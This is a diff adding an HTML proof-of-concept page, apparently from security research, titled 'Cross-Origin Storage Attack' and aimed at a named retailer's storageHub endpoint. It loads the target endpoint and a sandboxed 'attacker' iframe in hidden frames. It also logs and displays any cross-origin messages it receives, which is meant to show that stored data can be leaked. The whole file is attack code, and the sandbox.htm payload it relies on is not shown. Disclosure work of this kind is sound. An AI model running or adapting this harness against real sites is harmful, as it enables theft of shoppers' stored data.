@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>PoC: Cross-Origin Storage Attack</h1>
+     <script>
+      window.addEventListener("message", (e) => {
+        console.log("Received from storageHub:", e.origin, e.data);
+        // Show the response to prove the attack works
+        document.body.innerHTML += `<pre>${JSON.stringify(e.data, null, 2)}</pre>`;
+      });
+    </script>
+
+    <!-- Embed the target Newegg page -->
+    <iframe id="newegg-frame" src="https://newegg.com/api/storageHub" style="display:none;"></iframe>
+
+    <!-- Embed sandboxed attacker iframe -->
+    <iframe src="sandbox.htm" sandbox="allow-scripts" style="display:none;"></iframe>
+  </body>
+</html>
